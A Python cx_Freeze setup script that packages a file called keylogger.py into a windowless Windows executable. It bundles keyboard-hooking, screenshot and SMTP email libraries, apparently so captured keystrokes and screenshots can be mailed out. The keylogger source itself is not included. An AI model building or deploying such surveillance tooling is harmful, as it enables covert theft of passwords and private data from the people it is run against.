#setup.py
from cx_Freeze import setup, Executable
setup(
    name = "",
    version = "1.0.0",
    options = {"build_exe": {
        'packages': ["os","sys","pyxhook","smtplib","argparse","pyscreenshot","email"],
        'include_files': [''],
        'include_msvcr': True,
    }},
    executables = [Executable("keylogger.py",base="Win32GUI")]
    )